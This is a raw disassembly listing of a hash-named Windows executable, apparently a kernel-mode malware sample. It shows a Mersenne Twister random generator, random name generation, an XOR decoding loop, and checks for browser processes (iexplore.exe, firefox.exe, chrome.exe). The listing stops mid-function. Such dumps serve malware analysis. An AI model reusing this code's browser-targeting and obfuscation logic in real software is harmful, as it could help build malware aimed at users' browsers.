
890c3f1713989413f90f05db3918963dc20e1453f17ce7469f83e0509e545221.exe:     file format pei-i386


Disassembly of section .text:

00010600 <.text>:
   10600:	add    BYTE PTR [eax],al
   10602:	add    BYTE PTR [eax],al
   10604:	add    BYTE PTR [eax],al
   10606:	mov    edi,edi
   10608:	push   ebp
   10609:	mov    ebp,esp
   1060b:	mov    eax,DWORD PTR [ebp+0xc]
   1060e:	xor    eax,DWORD PTR [ebp+0x10]
   10611:	and    eax,0x7ffffffe
   10616:	xor    eax,DWORD PTR [ebp+0xc]
   10619:	shr    eax,1
   1061b:	xor    eax,DWORD PTR [ebp+0x8]
   1061e:	mov    DWORD PTR [ebp+0xc],eax
   10621:	xor    DWORD PTR [ebp+0xc],0x5
   10625:	xor    DWORD PTR [ebp+0xc],0x1
   10629:	xor    DWORD PTR [ebp+0xc],0x4
   1062d:	mov    eax,DWORD PTR [ebp+0x10]
   10630:	and    al,0x1
   10632:	movzx  ecx,al
   10635:	mov    eax,DWORD PTR [ebp+0xc]
   10638:	neg    ecx
   1063a:	sbb    ecx,ecx
   1063c:	and    ecx,0x9908b0df
   10642:	xor    eax,ecx
   10644:	pop    ebp
   10645:	ret    0xc
   10648:	int3   
   10649:	int3   
   1064a:	int3   
   1064b:	int3   
   1064c:	int3   
   1064d:	int3   
   1064e:	mov    edi,edi
   10650:	push   ebp
   10651:	mov    ebp,esp
   10653:	sub    esp,0x14
   10656:	mov    DWORD PTR [ebp-0x14],ecx
   10659:	mov    eax,DWORD PTR [ebp-0x14]
   1065c:	mov    DWORD PTR [ebp-0x8],eax
   1065f:	mov    eax,DWORD PTR [ebp-0x14]
   10662:	mov    DWORD PTR [ebp-0x10],eax
   10665:	mov    DWORD PTR [ebp-0x4],0x1
   1066c:	mov    DWORD PTR [ebp-0xc],0x509
   10673:	mov    eax,DWORD PTR [ebp-0x8]
   10676:	mov    ecx,DWORD PTR [ebp+0x8]
   10679:	mov    DWORD PTR [eax],ecx
   1067b:	mov    eax,DWORD PTR [ebp-0x8]
   1067e:	add    eax,0x4
   10681:	mov    DWORD PTR [ebp-0x8],eax
   10684:	jmp    0x1068d
   10686:	mov    eax,DWORD PTR [ebp-0x4]
   10689:	inc    eax
   1068a:	mov    DWORD PTR [ebp-0x4],eax
   1068d:	cmp    DWORD PTR [ebp-0x4],0x270
   10694:	jge    0x106c9
   10696:	mov    eax,DWORD PTR [ebp-0x10]
   10699:	mov    eax,DWORD PTR [eax]
   1069b:	shr    eax,0x1e
   1069e:	mov    ecx,DWORD PTR [ebp-0x10]
   106a1:	xor    eax,DWORD PTR [ecx]
   106a3:	imul   eax,eax,0x15747d
   106a9:	imul   eax,DWORD PTR [ebp-0xc]
   106ad:	add    eax,DWORD PTR [ebp-0x4]
   106b0:	mov    ecx,DWORD PTR [ebp-0x8]
   106b3:	mov    DWORD PTR [ecx],eax
   106b5:	mov    eax,DWORD PTR [ebp-0x8]
   106b8:	add    eax,0x4
   106bb:	mov    DWORD PTR [ebp-0x8],eax
   106be:	mov    eax,DWORD PTR [ebp-0x10]
   106c1:	add    eax,0x4
   106c4:	mov    DWORD PTR [ebp-0x10],eax
   106c7:	jmp    0x10686
   106c9:	leave  
   106ca:	ret    0x4
   106cd:	int3   
   106ce:	int3   
   106cf:	int3   
   106d0:	int3   
   106d1:	int3   
   106d2:	mov    edi,edi
   106d4:	push   ebp
   106d5:	mov    ebp,esp
   106d7:	push   ecx
   106d8:	push   ebx
   106d9:	push   esi
   106da:	push   edi
   106db:	mov    edi,ecx
   106dd:	mov    esi,edi
   106df:	mov    ebx,0xe3
   106e4:	push   DWORD PTR [esi+0x4]
   106e7:	mov    ecx,edi
   106e9:	push   DWORD PTR [esi]
   106eb:	dec    ebx
   106ec:	push   DWORD PTR [esi+0x634]
   106f2:	call   0x10606
   106f7:	mov    DWORD PTR [esi],eax
   106f9:	add    esi,0x4
   106fc:	test   ebx,ebx
   106fe:	jne    0x106e4
   10700:	mov    DWORD PTR [ebp-0x4],0x18c
   10707:	lea    ebx,[esi+0x4]
   1070a:	push   DWORD PTR [ebx]
   1070c:	mov    ecx,edi
   1070e:	push   DWORD PTR [esi]
   10710:	push   DWORD PTR [esi-0x38c]
   10716:	call   0x10606
   1071b:	dec    DWORD PTR [ebp-0x4]
   1071e:	mov    DWORD PTR [esi],eax
   10720:	mov    esi,ebx
   10722:	jne    0x10707
   10724:	push   DWORD PTR [edi]
   10726:	mov    ecx,edi
   10728:	push   DWORD PTR [esi]
   1072a:	push   DWORD PTR [esi-0x38c]
   10730:	call   0x10606
   10735:	mov    DWORD PTR [esi],eax
   10737:	mov    DWORD PTR [edi+0x9c4],0x270
   10741:	mov    DWORD PTR [edi+0x9c0],edi
   10747:	pop    edi
   10748:	pop    esi
   10749:	pop    ebx
   1074a:	leave  
   1074b:	ret    
   1074c:	int3   
   1074d:	int3   
   1074e:	int3   
   1074f:	int3   
   10750:	int3   
   10751:	int3   
   10752:	mov    edi,edi
   10754:	push   ebp
   10755:	mov    ebp,esp
   10757:	push   esi
   10758:	push   DWORD PTR [ebp+0x8]
   1075b:	mov    esi,ecx
   1075d:	call   0x1064e
   10762:	mov    ecx,esi
   10764:	call   0x106d2
   10769:	pop    esi
   1076a:	pop    ebp
   1076b:	ret    0x4
   1076e:	int3   
   1076f:	int3   
   10770:	int3   
   10771:	int3   
   10772:	int3   
   10773:	int3   
   10774:	mov    edi,edi
   10776:	push   esi
   10777:	push   edi
   10778:	mov    edi,ecx
   1077a:	lea    esi,[edi+0x9c4]
   10780:	cmp    DWORD PTR [esi],0x0
   10783:	jne    0x1078a
   10785:	call   0x106d2
   1078a:	dec    DWORD PTR [esi]
   1078c:	lea    eax,[edi+0x9c0]
   10792:	mov    edx,DWORD PTR [eax]
   10794:	mov    ecx,DWORD PTR [edx]
   10796:	add    edx,0x4
   10799:	mov    DWORD PTR [eax],edx
   1079b:	mov    eax,ecx
   1079d:	shr    eax,0xb
   107a0:	xor    ecx,eax
   107a2:	mov    eax,ecx
   107a4:	and    eax,0xff3a58ad
   107a9:	shl    eax,0x7
   107ac:	xor    ecx,eax
   107ae:	mov    eax,ecx
   107b0:	and    eax,0xffffdf8c
   107b5:	shl    eax,0xf
   107b8:	xor    ecx,eax
   107ba:	mov    eax,ecx
   107bc:	shr    eax,0x12
   107bf:	pop    edi
   107c0:	xor    eax,ecx
   107c2:	pop    esi
   107c3:	ret    
   107c4:	int3   
   107c5:	int3   
   107c6:	int3   
   107c7:	int3   
   107c8:	int3   
   107c9:	int3   
   107ca:	mov    edi,edi
   107cc:	push   ebp
   107cd:	mov    ebp,esp
   107cf:	push   esi
   107d0:	mov    esi,DWORD PTR [ebp+0x8]
   107d3:	shr    esi,1
   107d5:	or     esi,DWORD PTR [ebp+0x8]
   107d8:	push   edi
   107d9:	mov    eax,esi
   107db:	shr    eax,0x2
   107de:	or     esi,eax
   107e0:	mov    eax,esi
   107e2:	shr    eax,0x4
   107e5:	or     esi,eax
   107e7:	mov    eax,esi
   107e9:	shr    eax,0x8
   107ec:	or     esi,eax
   107ee:	mov    eax,esi
   107f0:	shr    eax,0x10
   107f3:	mov    edi,ecx
   107f5:	or     esi,eax
   107f7:	mov    ecx,edi
   107f9:	call   0x10774
   107fe:	and    eax,esi
   10800:	cmp    eax,DWORD PTR [ebp+0x8]
   10803:	ja     0x107f7
   10805:	pop    edi
   10806:	pop    esi
   10807:	pop    ebp
   10808:	ret    0x4
   1080b:	int3   
   1080c:	int3   
   1080d:	int3   
   1080e:	int3   
   1080f:	int3   
   10810:	mov    edi,edi
   10812:	push   ebp
   10813:	mov    ebp,esp
   10815:	sub    esp,0xa04
   1081b:	push   ebx
   1081c:	push   esi
   1081d:	mov    esi,DWORD PTR [ebp+0x14]
   10820:	push   edi
   10821:	test   esi,esi
   10823:	jne    0x108fe
   10829:	xor    ecx,ecx
   1082b:	lea    eax,[ebp-0x3c]
   1082e:	mov    edx,0xff
   10833:	shl    edx,cl
   10835:	and    edx,DWORD PTR [ebp+0x8]
   10838:	shr    edx,cl
   1083a:	inc    ecx
   1083b:	inc    ecx
   1083c:	mov    DWORD PTR [eax],edx
   1083e:	add    eax,0x4
   10841:	cmp    ecx,0x14
   10844:	jne    0x1082e
   10846:	mov    ebx,DWORD PTR [ebp+0xc]
   10849:	xor    eax,eax
   1084b:	mov    WORD PTR [ebx],ax
   1084e:	mov    eax,DWORD PTR [ebp-0x3c]
   10851:	push   0x5
   10853:	cdq    
   10854:	pop    ecx
   10855:	idiv   ecx
   10857:	mov    DWORD PTR [ebp-0x14],0x1deb6
   1085e:	mov    DWORD PTR [ebp-0x10],0x1deac
   10865:	mov    DWORD PTR [ebp-0xc],0x1dea4
   1086c:	mov    DWORD PTR [ebp-0x8],0x1de9a
   10873:	mov    DWORD PTR [ebp-0x4],0x1de90
   1087a:	mov    edx,DWORD PTR [ebp+edx*4-0x14]
   1087e:	mov    ecx,edx
   10880:	mov    ax,WORD PTR [edx]
   10883:	inc    edx
   10884:	inc    edx
   10885:	test   ax,ax
   10888:	jne    0x10880
   1088a:	sub    edx,ecx
   1088c:	mov    edi,ebx
   1088e:	dec    edi
   1088f:	mov    esi,ecx
   10891:	dec    edi
   10892:	mov    ax,WORD PTR [edi+0x2]
   10896:	inc    edi
   10897:	inc    edi
   10898:	test   ax,ax
   1089b:	jne    0x10892
   1089d:	mov    ecx,edx
   1089f:	shr    ecx,0x2
   108a2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   108a4:	mov    ecx,edx
   108a6:	and    ecx,0x3
   108a9:	mov    eax,ebx
   108ab:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   108ad:	lea    ecx,[eax+0x2]
   108b0:	mov    dx,WORD PTR [eax]
   108b3:	inc    eax
   108b4:	inc    eax
   108b5:	test   dx,dx
   108b8:	jne    0x108b0
   108ba:	sub    eax,ecx
   108bc:	sar    eax,1
   108be:	mov    ecx,eax
   108c0:	mov    eax,DWORD PTR [ebp-0x38]
   108c3:	push   0x3
   108c5:	cdq    
   108c6:	pop    esi
   108c7:	idiv   esi
   108c9:	cmp    edx,0xfffffffe
   108cc:	jle    0x109b3
   108d2:	add    edx,0x2
   108d5:	lea    esi,[ebp-0x34]
   108d8:	mov    DWORD PTR [ebp+0x8],edx
   108db:	mov    eax,DWORD PTR [esi]
   108dd:	cdq    
   108de:	push   0x1a
   108e0:	pop    edi
   108e1:	idiv   edi
   108e3:	add    esi,0x4
   108e6:	xor    eax,eax
   108e8:	add    edx,0x61
   108eb:	mov    WORD PTR [ebx+ecx*2],dx
   108ef:	inc    ecx
   108f0:	dec    DWORD PTR [ebp+0x8]
   108f3:	mov    WORD PTR [ebx+ecx*2],ax
   108f7:	jne    0x108db
   108f9:	jmp    0x109b3
   108fe:	cmp    esi,0x1
   10901:	je     0x1090e
   10903:	mov    eax,esi
   10905:	imul   eax,eax,0xa
   10908:	add    eax,DWORD PTR [ebp+0x10]
   1090b:	add    DWORD PTR [ebp+0x8],eax
   1090e:	push   DWORD PTR [ebp+0x8]
   10911:	lea    ecx,[ebp-0xa04]
   10917:	call   0x10752
   1091c:	lea    eax,[esi-0x1]
   1091f:	cmp    eax,0x6
   10922:	ja     0x10933
   10924:	imul   esi,esi,0x3
   10927:	add    esi,DWORD PTR [ebp+0x10]
   1092a:	mov    esi,DWORD PTR [esi*4+0x7eabc]
   10931:	jmp    0x10938
   10933:	mov    esi,0x1de8e
   10938:	mov    ebx,DWORD PTR [ebp+0xc]
   1093b:	xor    eax,eax
   1093d:	mov    WORD PTR [ebx],ax
   10940:	mov    eax,esi
   10942:	mov    edx,esi
   10944:	mov    cx,WORD PTR [eax]
   10947:	inc    eax
   10948:	inc    eax
   10949:	test   cx,cx
   1094c:	jne    0x10944
   1094e:	sub    eax,edx
   10950:	mov    edi,ebx
   10952:	dec    edi
   10953:	dec    edi
   10954:	mov    cx,WORD PTR [edi+0x2]
   10958:	inc    edi
   10959:	inc    edi
   1095a:	test   cx,cx
   1095d:	jne    0x10954
   1095f:	mov    ecx,eax
   10961:	shr    ecx,0x2
   10964:	mov    esi,edx
   10966:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10968:	mov    ecx,eax
   1096a:	and    ecx,0x3
   1096d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1096f:	nop
   10970:	mov    eax,ebx
   10972:	lea    ecx,[eax+0x2]
   10975:	mov    dx,WORD PTR [eax]
   10978:	inc    eax
   10979:	inc    eax
   1097a:	test   dx,dx
   1097d:	jne    0x10975
   1097f:	sub    eax,ecx
   10981:	sar    eax,1
   10983:	push   0x5
   10985:	mov    esi,eax
   10987:	pop    edi
   10988:	push   0x23
   1098a:	lea    ecx,[ebp-0xa04]
   10990:	call   0x107ca
   10995:	cmp    eax,0xa
   10998:	jae    0x1099f
   1099a:	add    eax,0x30
   1099d:	jmp    0x109a2
   1099f:	add    eax,0x57
   109a2:	movzx  eax,ax
   109a5:	mov    WORD PTR [ebx+esi*2],ax
   109a9:	inc    esi
   109aa:	xor    eax,eax
   109ac:	dec    edi
   109ad:	mov    WORD PTR [ebx+esi*2],ax
   109b1:	jne    0x10988
   109b3:	pop    edi
   109b4:	pop    esi
   109b5:	pop    ebx
   109b6:	leave  
   109b7:	ret    0x10
   109ba:	int3   
   109bb:	int3   
   109bc:	int3   
   109bd:	int3   
   109be:	int3   
   109bf:	int3   
   109c0:	mov    edi,edi
   109c2:	push   ebp
   109c3:	mov    ebp,esp
   109c5:	mov    eax,DWORD PTR [ebp+0x8]
   109c8:	lea    edx,[eax+0x2]
   109cb:	mov    cx,WORD PTR [eax]
   109ce:	inc    eax
   109cf:	inc    eax
   109d0:	test   cx,cx
   109d3:	jne    0x109cb
   109d5:	sub    eax,edx
   109d7:	sar    eax,1
   109d9:	pop    ebp
   109da:	ret    0x4
   109dd:	int3   
   109de:	int3   
   109df:	int3   
   109e0:	int3   
   109e1:	int3   
   109e2:	mov    eax,ecx
   109e4:	ret    
   109e5:	int3   
   109e6:	int3   
   109e7:	int3   
   109e8:	int3   
   109e9:	int3   
   109ea:	ret    
   109eb:	int3   
   109ec:	int3   
   109ed:	int3   
   109ee:	int3   
   109ef:	int3   
   109f0:	mov    edi,edi
   109f2:	push   ebp
   109f3:	mov    ebp,esp
   109f5:	push   esi
   109f6:	mov    esi,DWORD PTR [ebp+0x8]
   109f9:	push   edi
   109fa:	mov    edi,DWORD PTR [ebp+0xc]
   109fd:	jmp    0x10a4d
   109ff:	push   0x0
   10a01:	push   0x100
   10a06:	push   edi
   10a07:	push   esi
   10a08:	call   0x1dad2
   10a0d:	lea    eax,[eax*8+0x7eec8]
   10a14:	add    DWORD PTR [eax],esi
   10a16:	adc    DWORD PTR [eax+0x4],edi
   10a19:	test   edi,edi
   10a1b:	jl     0x10a56
   10a1d:	jg     0x10a23
   10a1f:	test   esi,esi
   10a21:	jbe    0x10a56
   10a23:	mov    eax,esi
   10a25:	xor    ecx,ecx
   10a27:	and    eax,0x1
   10a2a:	or     eax,ecx
   10a2c:	push   ecx
   10a2d:	jne    0x10a3a
   10a2f:	push   0x2
   10a31:	push   edi
   10a32:	push   esi
   10a33:	call   0x1dac6
   10a38:	jmp    0x10a49
   10a3a:	push   0x3
   10a3c:	push   edi
   10a3d:	push   esi
   10a3e:	call   0x1daba
   10a43:	add    eax,0x1
   10a46:	adc    edx,0x0
   10a49:	mov    edi,edx
   10a4b:	mov    esi,eax
   10a4d:	cmp    esi,0x4
   10a50:	jne    0x109ff
   10a52:	test   edi,edi
   10a54:	jne    0x109ff
   10a56:	mov    edx,edi
   10a58:	pop    edi
   10a59:	mov    eax,esi
   10a5b:	pop    esi
   10a5c:	pop    ebp
   10a5d:	ret    0x8
   10a60:	int3   
   10a61:	int3   
   10a62:	int3   
   10a63:	int3   
   10a64:	int3   
   10a65:	int3   
   10a66:	mov    edi,edi
   10a68:	push   ebp
   10a69:	mov    ebp,esp
   10a6b:	push   esi
   10a6c:	push   0x20
   10a6e:	push   0x61737973
   10a73:	push   DWORD PTR [ebp+0x8]
   10a76:	push   0x1
   10a78:	call   DWORD PTR ds:0x1f018
   10a7e:	mov    esi,eax
   10a80:	test   esi,esi
   10a82:	jne    0x10a8f
   10a84:	push   0xc000009a
   10a89:	call   DWORD PTR ds:0x1f014
   10a8f:	mov    eax,esi
   10a91:	pop    esi
   10a92:	pop    ebp
   10a93:	ret    
   10a94:	int3   
   10a95:	int3   
   10a96:	int3   
   10a97:	int3   
   10a98:	int3   
   10a99:	int3   
   10a9a:	mov    edi,edi
   10a9c:	push   ebp
   10a9d:	mov    ebp,esp
   10a9f:	cmp    DWORD PTR [ebp+0x8],0x0
   10aa3:	je     0x10ab0
   10aa5:	push   0x0
   10aa7:	push   DWORD PTR [ebp+0x8]
   10aaa:	call   DWORD PTR ds:0x1f01c
   10ab0:	pop    ebp
   10ab1:	ret    
   10ab2:	int3   
   10ab3:	int3   
   10ab4:	int3   
   10ab5:	int3   
   10ab6:	int3   
   10ab7:	int3   
   10ab8:	mov    edi,edi
   10aba:	push   esi
   10abb:	mov    esi,ecx
   10abd:	dec    DWORD PTR [esi+0x4]
   10ac0:	jne    0x10ad1
   10ac2:	push   DWORD PTR [esi]
   10ac4:	call   0x10a9a
   10ac9:	push   esi
   10aca:	call   0x10a9a
   10acf:	pop    ecx
   10ad0:	pop    ecx
   10ad1:	pop    esi
   10ad2:	ret    
   10ad3:	int3   
   10ad4:	int3   
   10ad5:	int3   
   10ad6:	int3   
   10ad7:	int3   
   10ad8:	mov    edi,edi
   10ada:	push   ebp
   10adb:	mov    ebp,esp
   10add:	push   esi
   10ade:	xor    esi,esi
   10ae0:	xor    edx,edx
   10ae2:	cmp    DWORD PTR [ebp+0xc],esi
   10ae5:	je     0x10b02
   10ae7:	mov    eax,DWORD PTR [ebp+0x8]
   10aea:	mov    ecx,DWORD PTR [ebp+0x10]
   10aed:	mov    cl,BYTE PTR [edx+ecx*1]
   10af0:	add    eax,esi
   10af2:	xor    BYTE PTR [eax],cl
   10af4:	lea    eax,[edx+0x1]
   10af7:	xor    edx,edx
   10af9:	div    DWORD PTR [ebp+0x14]
   10afc:	inc    esi
   10afd:	cmp    esi,DWORD PTR [ebp+0xc]
   10b00:	jne    0x10ae7
   10b02:	pop    esi
   10b03:	pop    ebp
   10b04:	ret    0x10
   10b07:	int3   
   10b08:	int3   
   10b09:	int3   
   10b0a:	int3   
   10b0b:	int3   
   10b0c:	mov    edi,edi
   10b0e:	push   ebp
   10b0f:	mov    ebp,esp
   10b11:	mov    ecx,DWORD PTR [ebp+0x8]
   10b14:	mov    eax,ecx
   10b16:	lea    edx,[eax+0x2]
   10b19:	push   esi
   10b1a:	mov    si,WORD PTR [eax]
   10b1d:	inc    eax
   10b1e:	inc    eax
   10b1f:	test   si,si
   10b22:	jne    0x10b1a
   10b24:	sub    eax,edx
   10b26:	sar    eax,1
   10b28:	cmp    eax,0xc
   10b2b:	jae    0x10b34
   10b2d:	xor    al,al
   10b2f:	jmp    0x10c02
   10b34:	lea    eax,[ecx+eax*2-0x18]
   10b38:	movzx  ecx,WORD PTR [eax]
   10b3b:	cmp    cx,0x69
   10b3f:	je     0x10b47
   10b41:	cmp    cx,0x49
   10b45:	jne    0x10b2d
   10b47:	movzx  ecx,WORD PTR [eax+0x2]
   10b4b:	push   0x45
   10b4d:	pop    esi
   10b4e:	push   0x65
   10b50:	pop    edx
   10b51:	cmp    cx,dx
   10b54:	je     0x10b5b
   10b56:	cmp    cx,si
   10b59:	jne    0x10b2d
   10b5b:	movzx  ecx,WORD PTR [eax+0x4]
   10b5f:	cmp    cx,0x78
   10b63:	je     0x10b6b
   10b65:	cmp    cx,0x58
   10b69:	jne    0x10b2d
   10b6b:	movzx  ecx,WORD PTR [eax+0x6]
   10b6f:	cmp    cx,0x70
   10b73:	je     0x10b7b
   10b75:	cmp    cx,0x50
   10b79:	jne    0x10b2d
   10b7b:	movzx  ecx,WORD PTR [eax+0x8]
   10b7f:	cmp    cx,0x6c
   10b83:	je     0x10b8b
   10b85:	cmp    cx,0x4c
   10b89:	jne    0x10b2d
   10b8b:	movzx  ecx,WORD PTR [eax+0xa]
   10b8f:	cmp    cx,0x6f
   10b93:	je     0x10b9b
   10b95:	cmp    cx,0x4f
   10b99:	jne    0x10b2d
   10b9b:	movzx  ecx,WORD PTR [eax+0xc]
   10b9f:	cmp    cx,0x52
   10ba3:	je     0x10bab
   10ba5:	cmp    cx,0x72
   10ba9:	jne    0x10b2d
   10bab:	movzx  ecx,WORD PTR [eax+0xe]
   10baf:	cmp    cx,dx
   10bb2:	je     0x10bbd
   10bb4:	cmp    cx,si
   10bb7:	jne    0x10b2d
   10bbd:	cmp    WORD PTR [eax+0x10],0x2e
   10bc2:	jne    0x10b2d
   10bc8:	movzx  ecx,WORD PTR [eax+0x12]
   10bcc:	cmp    cx,dx
   10bcf:	je     0x10bda
   10bd1:	cmp    cx,si
   10bd4:	jne    0x10b2d
   10bda:	movzx  ecx,WORD PTR [eax+0x14]
   10bde:	cmp    cx,0x78
   10be2:	je     0x10bee
   10be4:	cmp    cx,0x58
   10be8:	jne    0x10b2d
   10bee:	movzx  eax,WORD PTR [eax+0x16]
   10bf2:	cmp    ax,dx
   10bf5:	je     0x10c00
   10bf7:	cmp    ax,si
   10bfa:	jne    0x10b2d
   10c00:	mov    al,0x1
   10c02:	pop    esi
   10c03:	pop    ebp
   10c04:	ret    0x4
   10c07:	int3   
   10c08:	int3   
   10c09:	int3   
   10c0a:	int3   
   10c0b:	int3   
   10c0c:	mov    edi,edi
   10c0e:	push   ebp
   10c0f:	mov    ebp,esp
   10c11:	mov    ecx,DWORD PTR [ebp+0x8]
   10c14:	mov    eax,ecx
   10c16:	lea    edx,[eax+0x2]
   10c19:	push   esi
   10c1a:	mov    si,WORD PTR [eax]
   10c1d:	inc    eax
   10c1e:	inc    eax
   10c1f:	test   si,si
   10c22:	jne    0x10c1a
   10c24:	sub    eax,edx
   10c26:	sar    eax,1
   10c28:	pop    esi
   10c29:	cmp    eax,0xb
   10c2c:	jae    0x10c35
   10c2e:	xor    al,al
   10c30:	jmp    0x10cf1
   10c35:	lea    eax,[ecx+eax*2-0x16]
   10c39:	movzx  ecx,WORD PTR [eax]
   10c3c:	cmp    cx,0x66
   10c40:	je     0x10c48
   10c42:	cmp    cx,0x46
   10c46:	jne    0x10c2e
   10c48:	movzx  ecx,WORD PTR [eax+0x2]
   10c4c:	cmp    cx,0x69
   10c50:	je     0x10c58
   10c52:	cmp    cx,0x49
   10c56:	jne    0x10c2e
   10c58:	movzx  ecx,WORD PTR [eax+0x4]
   10c5c:	cmp    cx,0x72
   10c60:	je     0x10c68
   10c62:	cmp    cx,0x52
   10c66:	jne    0x10c2e
   10c68:	movzx  ecx,WORD PTR [eax+0x6]
   10c6c:	cmp    cx,0x65
   10c70:	je     0x10c78
   10c72:	cmp    cx,0x45
   10c76:	jne    0x10c2e
   10c78:	movzx  ecx,WORD PTR [eax+0x8]
   10c7c:	cmp    cx,0x66
   10c80:	je     0x10c88
   10c82:	cmp    cx,0x46
   10c86:	jne    0x10c2e
   10c88:	movzx  ecx,WORD PTR [eax+0xa]
   10c8c:	cmp    cx,0x6f
   10c90:	je     0x10c98
   10c92:	cmp    cx,0x4f
   10c96:	jne    0x10c2e
   10c98:	movzx  ecx,WORD PTR [eax+0xc]
   10c9c:	cmp    cx,0x58
   10ca0:	je     0x10ca8
   10ca2:	cmp    cx,0x78
   10ca6:	jne    0x10c2e
   10ca8:	cmp    WORD PTR [eax+0xe],0x2e
   10cad:	jne    0x10c2e
   10cb3:	movzx  ecx,WORD PTR [eax+0x10]
   10cb7:	cmp    cx,0x65
   10cbb:	je     0x10cc7
   10cbd:	cmp    cx,0x45
   10cc1:	jne    0x10c2e
   10cc7:	movzx  ecx,WORD PTR [eax+0x12]
   10ccb:	cmp    cx,0x78
   10ccf:	je     0x10cdb
   10cd1:	cmp    cx,0x58
   10cd5:	jne    0x10c2e
   10cdb:	movzx  eax,WORD PTR [eax+0x14]
   10cdf:	cmp    ax,0x65
   10ce3:	je     0x10cef
   10ce5:	cmp    ax,0x45
   10ce9:	jne    0x10c2e
   10cef:	mov    al,0x1
   10cf1:	pop    ebp
   10cf2:	ret    0x4
   10cf5:	int3   
   10cf6:	int3   
   10cf7:	int3   
   10cf8:	int3   
   10cf9:	int3   
   10cfa:	mov    edi,edi
   10cfc:	push   ebp
   10cfd:	mov    ebp,esp
   10cff:	mov    ecx,DWORD PTR [ebp+0x8]
   10d02:	mov    eax,ecx
   10d04:	lea    edx,[eax+0x2]
   10d07:	push   esi
   10d08:	mov    si,WORD PTR [eax]
   10d0b:	inc    eax
   10d0c:	inc    eax
   10d0d:	test   si,si
   10d10:	jne    0x10d08
   10d12:	sub    eax,edx
   10d14:	sar    eax,1
   10d16:	pop    esi
   10d17:	cmp    eax,0xa
   10d1a:	jae    0x10d23
   10d1c:	xor    al,al
   10d1e:	jmp    0x10dcb
   10d23:	lea    eax,[ecx+eax*2-0x14]
   10d27:	movzx  ecx,WORD PTR [eax]
   10d2a:	cmp    cx,0x63
   10d2e:	je     0x10d36
   10d30:	cmp    cx,0x43
   10d34:	jne    0x10d1c
   10d36:	movzx  ecx,WORD PTR [eax+0x2]
   10d3a:	cmp    cx,0x68
   10d3e:	je     0x10d46
   10d40:	cmp    cx,0x48
   10d44:	jne    0x10d1c
   10d46:	movzx  ecx,WORD PTR [eax+0x4]
   10d4a:	cmp    cx,0x72
   10d4e:	je     0x10d56
   10d50:	cmp    cx,0x52
   10d54:	jne    0x10d1c
   10d56:	movzx  ecx,WORD PTR [eax+0x6]
   10d5a:	cmp    cx,0x6f
   10d5e:	je     0x10d66
   10d60:	cmp    cx,0x4f
   10d64:	jne    0x10d1c
   10d66:	movzx  ecx,WORD PTR [eax+0x8]
   10d6a:	cmp    cx,0x6d
   10d6e:	je     0x10d76
   10d70:	cmp    cx,0x4d
   10d74:	jne    0x10d1c
   10d76:	movzx  ecx,WORD PTR [eax+0xa]
   10d7a:	cmp    cx,0x65
   10d7e:	je     0x10d86
   10d80:	cmp    cx,0x45
   10d84:	jne    0x10d1c
   10d86:	cmp    WORD PTR [eax+0xc],0x2e
   10d8b:	jne    0x10d1c
   10d8d:	movzx  ecx,WORD PTR [eax+0xe]
   10d91:	cmp    cx,0x65
   10d95:	je     0x10da1
   10d97:	cmp    cx,0x45
   10d9b:	jne    0x10d1c
   10da1:	movzx  ecx,WORD PTR [eax+0x10]
   10da5:	cmp    cx,0x78
   10da9:	je     0x10db5
   10dab:	cmp    cx,0x58
   10daf:	jne    0x10d1c
   10db5:	movzx  eax,WORD PTR [eax+0x12]
   10db9:	cmp    ax,0x65
   10dbd:	je     0x10dc9
   10dbf:	cmp    ax,0x45
   10dc3:	jne    0x10d1c
   10dc9:	mov    al,0x1
   10dcb:	pop    ebp
   10dcc:	ret    0x4
   10dcf:	int3   
   10dd0:	int3   
   10dd1:	int3   
   10dd2:	int3   
   10dd3:	int3   
   10dd4:	mov    edi,edi
   10dd6:	push   ebp
   10dd7:	mov    ebp,esp
   10dd9:	push   DWORD PTR [ebp+0x8]
   10ddc:	call   0x10b0c
   10de1:	test   al,al
   10de3:	je     0x10dea
   10de5:	xor    eax,eax
   10de7:	inc    eax
   10de8:	jmp    0x10e0d
   10dea:	push   DWORD PTR [ebp+0x8]
   10ded:	call   0x10c0c
   10df2:	test   al,al
   10df4:	je     0x10dfb
   10df6:	push   0x2
   10df8:	pop    eax
   10df9:	jmp    0x10e0d
   10dfb:	push   DWORD PTR [ebp+0x8]
   10dfe:	call   0x10cfa
   10e03:	movzx  eax,al
   10e06:	neg    eax
   10e08:	sbb    eax,eax
   10e0a:	and    eax,0x3
   10e0d:	pop    ebp
   10e0e:	ret    0x4
   10e11:	int3   
   10e12:	int3   
   10e13:	int3   
   10e14:	int3   
   10e15:	int3   
   10e16:	mov    edi,edi
   10e18:	push   ebp
   10e19:	mov    ebp,esp
   10e1b:	sub    esp,0x10
   10e1e:	push   esi
   10e1f:	push   edi
   10e20:	xor    eax,eax
   10e22:	mov    WORD PTR [ebp-0x8],ax
   10e26:	lea    edi,[ebp-0x6]
   10e29:	stos   DWORD PTR es:[edi],eax
   10e2a:	stos   WORD PTR es:[edi],ax
   10e2c:	mov    eax,DWORD PTR [ebp+0xc]
   10e2f:	mov    DWORD PTR [ebp-0x4],eax
   10e32:	lea    ecx,[eax+0x2]
   10e35:	mov    dx,WORD PTR [eax]
   10e38:	inc    eax
   10e39:	inc    eax
   10e3a:	test   dx,dx
   10e3d:	jne    0x10e35
   10e3f:	mov    esi,DWORD PTR [ebp+0x8]
   10e42:	movzx  edx,WORD PTR [esi]
   10e45:	sub    eax,ecx
   10e47:	sar    eax,1
   10e49:	lea    ecx,[eax+eax*1]
   10e4c:	mov    WORD PTR [ebp-0x8],cx
   10e50:	mov    WORD PTR [ebp-0x6],cx
   10e54:	cmp    dx,cx
   10e57:	jb     0x10e96
   10e59:	xor    eax,eax
   10e5b:	lea    edi,[ebp-0xe]
   10e5e:	stos   DWORD PTR es:[edi],eax
   10e5f:	stos   WORD PTR es:[edi],ax
   10e61:	mov    WORD PTR [ebp-0x10],cx
   10e65:	mov    WORD PTR [ebp-0xe],cx
   10e69:	movzx  eax,dx
   10e6c:	movzx  ecx,cx
   10e6f:	sub    eax,ecx
   10e71:	mov    ecx,DWORD PTR [esi+0x4]
   10e74:	cdq    
   10e75:	sub    eax,edx
   10e77:	sar    eax,1
   10e79:	lea    eax,[ecx+eax*2]
   10e7c:	mov    DWORD PTR [ebp-0xc],eax
   10e7f:	push   0x1
   10e81:	lea    eax,[ebp-0x8]
